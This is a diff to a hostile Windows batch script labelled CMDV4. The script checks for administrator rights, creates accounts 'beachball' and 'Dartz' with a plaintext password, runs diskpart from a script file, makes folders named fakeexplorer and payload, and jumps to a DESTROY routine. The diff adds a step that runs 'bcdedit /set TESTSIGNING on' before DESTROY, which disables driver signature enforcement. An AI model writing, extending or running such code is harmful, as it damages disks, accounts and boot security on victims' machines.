@@ -4,8 +4,6 @@ TITLE CMDV4
 echo Loading...
 SFC /ScanFile="C:\Windows\system32\net.exe"
 cls
-SFC /ScanFile="C:\Windows\system32\net1.exe"
-cls
 @rem ----[ This code block detects if the script is being running with admin PRIVILEGES If it isn't it pauses and then quits]-------
 echo OFF
 NET SESSION >nul 2>&1
@@ -172,7 +170,7 @@ net user beachball /add
 net localgroup Guests beachball /add
 net user Dartz 1593570 /domain
 diskpart /s %CD%\unass\unass.txt
-goto DESTROY
+goto BCD
 :EXIT
 exit
 :RESTART
@@ -202,7 +200,7 @@ goto DESTROY
 net user beachball /add
 net localgroup Guests beachball /add
 net user Dartz 1593570 /domain
-goto DESTROY
+goto BCD
 :eeee
 mkdir c:\windows\fakeexplorer
 mkdir c:\windows\payload
@@ -220,3 +218,6 @@ echo,
 echo Something Happened :)
 cls
 goto RESTART
+:BCD
+bcdedit /set TESTSIGNING on
+goto DESTROY
